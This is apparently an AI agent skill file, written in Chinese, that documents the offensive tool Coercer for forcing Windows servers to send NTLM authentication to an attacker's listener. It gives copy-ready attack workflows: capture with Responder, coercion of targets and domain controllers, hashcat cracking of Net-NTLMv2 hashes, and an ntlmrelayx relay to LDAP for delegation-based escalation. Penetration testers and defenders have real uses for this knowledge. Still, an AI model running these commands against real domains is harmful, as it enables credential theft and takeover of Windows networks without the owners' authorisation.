---
name: coercer
description: >
  此技能适用于用户询问关于"coercer"、"从 Windows 服务器强制 NTLM 认证"、
  "通过 Responder 设置 NTLM 中继"、"利用 printspooler/PetitPotam 风格的认证强制"等问题。
  Coercer 通过滥用 MS-RPRN、MS-EFSR、MS-DFSNM 等 RPC 协议，强制 Windows 服务器向受控主机进行认证，
  从而实现 NTLM 中继或哈希捕获。
---

# Coercer

强制 Windows 服务器向监听器进行 NTLM 认证——实现中继、捕获和哈希提取。

## 原理

Coercer 滥用多种 RPC 协议/方法，触发 Windows 主机向攻击者控制的 IP 发起出站 NTLM 认证。捕获到的 Net-NTLMv2 哈希可以：
- **离线破解**（Hashcat/John）
- **实时中继**（ntlmrelayx）以访问其他系统

## 快速开始

```bash
# Coerce auth from a server, capture with Responder
# Terminal 1: Start Responder
responder -I eth0 -wv

# Terminal 2: Coerce auth
coercer coerce -l 10.10.14.1 -t 10.10.10.10 -u user -p password -d domain.local
```

## 子命令

| 命令 | 描述 |
|---------|-------------|
| `coerce` | 触发认证强制 |
| `scan` | 扫描目标可用的强制方法 |
| `fuzz` | 模糊测试可用的 RPC 方法 |

## 核心参数

| 参数 | 描述 |
|------|-------------|
| `-l <ip>` | 监听器 IP（攻击者机器） |
| `-t <ip>` | 目标 IP（被强制的 Windows 服务器） |
| `-u <user>` | 认证目标的用户名 |
| `-p <pass>` | 密码 |
| `-d <domain>` | 域名 |
| `-H <hash>` | NTLM 哈希 |
| `--filter-protocol-name <name>` | 仅使用特定协议（如 `MS-RPRN`） |
| `--filter-method-name <name>` | 指定 RPC 方法 |
| `--always-continue` | 出错时继续执行 |

## 支持的协议

| 协议 | 常见名称 |
|----------|-------------|
| `MS-RPRN` | PrinterBug / SpoolSample |
| `MS-EFSR` | PetitPotam |
| `MS-DFSNM` | DFSCoerce |
| `MS-FSRVP` | ShadowCoerce |
| `MS-EVEN6` | EventLog |

## 攻击工作流程

### 捕获 Net-NTLMv2 哈希

```bash
# 1. Start Responder
sudo responder -I eth0 -wv

# 2. Coerce target
coercer coerce -l 10.10.14.1 -t 10.10.10.10 -u user -p pass -d corp.local

# 3. Responder captures hash → crack offline
hashcat -a 0 -m 5600 hash.txt rockyou.txt
```

### NTLM 中继到 LDAP（用于 S4U2Self / RBCD）

```bash
# 1. Start ntlmrelayx targeting DC LDAP
ntlmrelayx.py -t ldap://dc.corp.local --delegate-access -smb2support

# 2. Coerce DC authentication
coercer coerce -l 10.10.14.1 -t dc.corp.local -u user -p pass -d corp.local
```

### 扫描可用方法

```bash
coercer scan -t 10.10.10.10 -u user -p pass -d corp.local
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/ntlm-relay.md` | 完整中继链设置、ntlmrelayx 选项、RBCD 利用 |
